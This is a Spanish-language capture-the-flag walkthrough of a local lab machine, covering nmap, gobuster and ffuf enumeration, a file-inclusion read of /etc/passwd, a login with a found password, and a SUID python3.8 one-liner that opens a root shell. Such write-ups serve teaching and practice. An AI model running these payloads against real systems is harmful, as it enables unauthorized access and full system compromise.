nmap:  22,80

![image](https://github.com/user-attachments/assets/eaad09c8-5a05-446f-96cb-e8c76e63dd4f)

en la pagina como en el nmap, vemos que es apache2, en el código fuente no hay nada, hacemos un gobuster

     gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,py,txt -t 64


y nos da in index.php

![image](https://github.com/user-attachments/assets/31191b22-876a-44d3-8876-3e596b67f795)

![image](https://github.com/user-attachments/assets/6ff70d6f-697d-4666-90f8-355f6bbe8d46)

buscamos eso y da solo en la pagina un "balu"

![image](https://github.com/user-attachments/assets/fed9b04c-c1b9-48ad-a9b4-bf5ad959017d)

probé con hydra pero no obtuve nada. Como la carpeta o directorio que nos dio, podemos probar con ffuf

     ffuf -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 

y nos dio un: page

![image](https://github.com/user-attachments/assets/030a13f1-9264-48ee-a294-ac3b02cebad3)

y obtenemos

![image](https://github.com/user-attachments/assets/6b8483b6-54ab-4e9d-a79b-f37136262969)

nos dan dos usuarios: pinguino y mario. probamos a los usuarios con la contraseña "balu"

entramos

![image](https://github.com/user-attachments/assets/6e168484-ed12-487a-b28a-a379ec8e0a4b)

y escalamos a mario muy facil

![image](https://github.com/user-attachments/assets/5e88059d-1d92-4c99-b3f9-d1f2bb135098)

utilizamos el comando

     find / -perm -4000 -ls 2>/dev/null

y nos da un binario importante 

![image](https://github.com/user-attachments/assets/dcda9d1d-36af-4c7b-9321-a1eaa8fdbbd9)

la buscamos en https://gtfobins.github.io/gtfobins/python/#sudo

![image](https://github.com/user-attachments/assets/801624b3-5d4e-41b3-9aeb-8e6df74b59f5)

modificamos el python a python3.8 como el binario y lanzamos

     python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

![image](https://github.com/user-attachments/assets/1c611e03-21bb-441c-9bb4-87460a6903b5)

somos root!
